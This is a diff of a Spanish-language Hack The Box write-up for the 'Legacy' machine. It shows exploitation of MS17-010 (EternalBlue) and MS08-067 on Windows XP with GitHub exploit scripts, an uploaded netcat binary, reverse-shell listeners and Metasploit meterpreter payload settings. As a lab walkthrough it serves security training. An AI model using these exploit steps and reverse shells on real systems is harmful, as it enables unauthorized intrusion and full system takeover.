@@ -15,23 +15,33 @@ tags:
   - Windows
   - SMB
   - Remote Command Execution (RCE)
-  - Eternal Blue - MS17-010
+  - Eternal Blue MS17-010 (RCE)
+  - Malicious Payload
   - Reverse Shell
-  - Microsoft Windows Server Code Execution - MS08-067
+  - Privesc - Eternal Blue MS17-010 (RCE)
+  - Microsoft Windows Server Code Execution MS08-067 (MWSCE MS08-067)
+  - Privesc - MWSCE MS08-067
   - OSCP Style
   - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-legacy/legacy_logo.png)
+
 Una máquina no tan complicada, ya que vamos a utilizar un Exploit que ya hemos usado antes con la **máquina Blue**, la diferencia radica en los **named pipes** activos en el **servicio SMB** que está activo, hay varias manera de aprovecharnos de este, vamos a probar 3 diferentes.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *smbclient*
 * *python2*
 * *Impacket*
+* *smbserver.py*
+* *git*
+* *tcpdump*
+* *locate*
 * *msfvenom*
 * *nc*
-* *metasploit framework*
+* *metasploit framework(msfconsole)*
+* *Módulo: exploit/windows/smb/ms08_067_netapi*
 
 
 <br>
@@ -57,9 +67,6 @@ Herramientas utilizadas:
 					<li><a href="#Descarga">Descargando Exploit e Investigando las Named Pipes</a></li>
 					<li><a href="#Configure">Configurando Exploit para su Uso</a></li>
 				</ul>
-			</ul>
-		<li><a href="#Otras">Otras Formas</a></li>
-                        <ul>
                                 <li><a href="#Exploit3">Variante de Exploit eternalBlue de GitHub</a></li>
                                 <li><a href="#Exploit4">Usando Exploit MS08-062 de Metasploit</a></li>
                         </ul>
@@ -72,10 +79,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -191,10 +195,7 @@ No pues no, entonces es momento de investigar por internet un Exploit que nos si
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -202,7 +203,6 @@ No pues no, entonces es momento de investigar por internet un Exploit que nos si
 <h2 id="SMB">Investigando Vulnerabilidades con NMAP</h2>
 
 Como ya vimos, la máquina ocupa el **servicio SMB**, vamos a aplicar algunos comandos con **nmap** para saber si tiene alguna vulnerabilidad:
-
 ```bash
 nmap --script "vuln and safe" -p 445 10.10.10.4 -oN vulns
 Starting Nmap 7.93 ( https://nmap.org ) CST
@@ -275,27 +275,26 @@ Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Executi
 Shellcodes: No Results
 Papers: No Results
 ```
-Si recordamos un poco la **máquina Blue**, estariamos haciendo lo mismo que hicimos aquella vez al momento de utilizar el Exploit del EternalBlue, por lo que, vamos a repetir el mismo proceso, pero vamos a utilizar la versión de GitHub, ya que es un poco más estable esa versión, al ser ideada para usarse en cualquier versión de Windows, pues parece ser que esta máquina usa un Windows XP. lo cual nos puede traer problemas con las versiones de este Exploit que ocupemos.
+Si recordamos un poco la **máquina Blue**, estariamos haciendo lo mismo que hicimos aquella vez al momento de utilizar el Exploit del **EternalBlue**, por lo que vamos a repetir el mismo proceso, pero vamos a utilizar la versión de **GitHub**, ya que es un poco más estable esa versión, al ser ideada para usarse en cualquier versión de **Windows**, pues parece ser que esta máquina usa un **Windows XP**. lo cual nos puede traer problemas con las versiones de este Exploit que ocupemos.
 
 
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
 
 <h2 id="Exploit2">Configurando y Usando Exploit eternalBlue de GitHub</h2>
 
+<br>
+
 <h3 id="Descarga">Descargando Exploit e Investigando las Named Pipes</h3>
 
 Vamonos por pasos:
-* Descargamos el **GitHub**:** https://github.com/worawit/MS17-010**
+* Descargamos el **GitHub**: <a href="https://github.com/worawit/MS17-010" target="_blank">Repositorio de worawit: MS17-010</a>
 ```bash
 git clone https://github.com/worawit/MS17-010       
 Clonando en 'MS17-010'...
@@ -304,6 +303,7 @@ remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
 Recibiendo objetos: 100% (183/183), 113.61 KiB | 908.00 KiB/s, listo.
 Resolviendo deltas: 100% (102/102), listo.
 ```
+
 * Entramos al directorio:
 ```bash
 ls
@@ -312,6 +312,7 @@ checker.py               eternalchampion_leak.py  eternalromance_poc2.py  infole
 eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py               zzz_exploit.py
 eternalblue_exploit8.py  eternalchampion_poc.py   eternalsynergy_leak.py  npp_control.p
 ```
+
 * Recuerda que hay 2 scripts que vamos a usar:
   * checker.py
   * zzz_exploit.py
@@ -338,7 +339,6 @@ Ya vimos 2 **named pipes** con **OK**, lo que quiere decir que pueden ser vulner
 <h3 id="Configure">Configurando Exploit para su Uso</h3>
 
 Abre el script **zzz_exploit.py** y modifica las siguientes lineas:
-
 ```bash
 USERNAME = ''
 PASSWORD = ''
@@ -346,7 +346,8 @@ PASSWORD = ''
 smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
         service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
 ```
-Nos pide 2 parámetros, los cuales no tenemos de momento y están esos 2 lineas de código, que estan en la función **smb_pwn**. Aquí, la desventaja es que no nos podemos loguear en el **servicio SMB** a diferencia de lo que podiamos hacer en la máquina Blue. Lo que podemos probar es, si con la **named pipe spoolss** o **browser** podemos inyectar código.
+
+Nos pide 2 parámetros, los cuales no tenemos de momento y están esos 2 lineas de código, que estan en la función **smb_pwn**. Aquí, la desventaja es que no nos podemos loguear en el **servicio SMB** a diferencia de lo que podiamos hacer en la **máquina Blue**. Lo que podemos probar es, si con la **named pipe spoolss** o **browser** podemos inyectar código.
 
 Pero, ¿qué son las **named pipes spoolss y browser**?
 
@@ -394,10 +395,10 @@ modify transaction struct for arbitrary read/write
 make this SMB session to be SYSTEM
 ...
 ```
+
 Observa como en el **tcpdump** esta capturando la **traza ICMP**, entonces si es posible la inyección de comandos, osea que la máquina es vulnerable. Vamos a intentar subir una **netcat** desde ahí, para tratar de conectarnos de manera remota a la máquina. Vamos por pasos:
 
 * Busquemos una **netcat**, en Kali ya tenemos una por defecto, solo tienes que buscarla con el comando **locate** y copiarla donde la vayas a ocupar:
-
 ```bash
 locate nc.exe 
 /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
@@ -427,6 +428,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 ```
+
 * Una vez alzado, activamos una **netcat** en nuestra máquina. Aca puedes usar tambien **rlwrap**, pero no lo veo tan necesario, por eso usamos **netcat**:
 ```bash
 nc -nvlp 443           
@@ -448,7 +450,7 @@ operable program or batch file.
 Gracias al **Eternal Blue**, entramos directamente como **NT Authority System**, aunque me parece extraño que no podamos usar el comando **whoami**. 
 
 * Ya solo buscamos las flags y ya tendríamos lista esta máquina:
-```bash
+```batch
 C:\WINDOWS\system32>cd C:\
 cd C:\
 C:\>dir
@@ -481,30 +483,15 @@ dir
 ```
 Las flags están en **John** y **Administrator**.
 
-
-<br>
-<br>
-<hr>
-<div style="position: relative;">
- <h1 id="Otras" style="text-align:center;">Otras Formas</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
-</div>
-<br>
-
-
 Bueno, existen otras dos formas de poder ganar acceso a esta máquina, una será usando una variante del Exploit de **GitHub** que ya usamos, y la otra será usando el **Metasploit Framework**, así que, primero vamos a probar la variante.
 
 <h2 id="Exploit3">Variante de Exploit eternalBlue de GitHub</h2>
 
 Esta forma la encontré usando el método que se usó en el siguiente link: 
-
-* https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/
+* <a href="https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/" target="_blank">Exploiting MS17-010 without Metasploit (Win XP SP3)</a>
 
 Vamos a descargar el siguiente repositorio: 
-
-* https://github.com/helviojunior/MS17-010
+* <a href="https://github.com/helviojunior/MS17-010" target="_blank">Repositorio de helviojunior: MS17-010</a>
 
 Este que contiene una variante del **zzz_exploit.py** que, por así decirlo, nos automatiza un poco el proceso, pues ya solo tendríamos que comentar un par de líneas y debemos crear un Payload con **Msfvenom** como en la **máquina Blue**.
 ```bash
@@ -567,7 +554,7 @@ SESSION: 0xe228e3e8
 ```
 
 * Vemos la **netcat** y ya estamos dentro:
-```bash
+```batch
 nc -nvlp 443
 listening on [any] 443 ...
 connect to [Tu_IP] from (UNKNOWN) [10.10.10.4] 1038
@@ -599,6 +586,7 @@ dir
                4 File(s)         73.802 bytes
                3 Dir(s)   6.403.895.296 bytes free
 ```
+
 **Nota**: 
 Aquí lo que hace es cargar el archivo **ETYX3D.exe**, dicho archivo es el que se crea en la función **send_and_execute**, así que este es el que entiendo hace la conexión hacia nuestra **netcat**.
 
@@ -694,7 +682,7 @@ Payload options (windows/meterpreter/reverse_tcp):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LHOST     Tu_IP        yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 .
 .
@@ -781,11 +769,9 @@ Bien podríamos probar los Exploits del **Eternal Blue** que son exclusivos de *
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://www.getastra.com/blog/security-audit/how-to-hack-windows-xp-using-metasploit-kali-linux-ms08067/
 * https://github.com/EEsshq/CVE-2017-0144---EtneralBlue-MS17-010-Remote-Code-Execution
@@ -799,3 +785,48 @@ Bien podríamos probar los Exploits del **Eternal Blue** que son exclusivos de *
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
